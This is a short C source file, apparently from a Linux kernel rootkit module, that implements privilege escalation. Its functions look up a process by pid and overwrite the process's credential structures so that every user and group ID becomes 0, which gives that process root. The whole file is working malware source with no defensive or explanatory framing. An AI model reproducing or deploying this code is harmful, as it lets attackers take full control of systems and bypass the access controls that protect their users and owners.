
#include <priv_escalation.h>

/* change a given credential struct to root privileges */
void root_creds(struct cred *c) {
	c->uid.val = 0;
	c->gid.val = 0;
	c->euid.val = 0;
	c->egid.val = 0;
	c->suid.val = 0;
	c->sgid.val = 0;
	c->fsuid.val = 0;
	c->fsgid.val = 0;
}

/* 
 * give root privileges to the process with given pid
 * a pid of 0 will give root to the current process 
 */
void give_root(int pid) {
	struct task_struct *task;
	if (pid == 0) {
		task = current;
	} else {
		task = find_task_from_pid(pid);
		if (task == NULL) {
			return;
		}
	}
	root_creds(task->cred);
	root_creds(task->real_cred);
}

/* return the task struct associated with a given pid, or NULL on fail */
struct task_struct *find_task_from_pid(int pid) {
	struct pid *task_pid;
	task_pid = find_vpid(pid);
	if (task_pid == NULL) {
		printk(KERN_INFO "Did not find pid struct from given pid\n");
		return NULL;
	}
	/* use the pid struct to find the task struct */
	struct task_struct *task = NULL;
	task = pid_task(task_pid, PIDTYPE_PID);
	return task;
}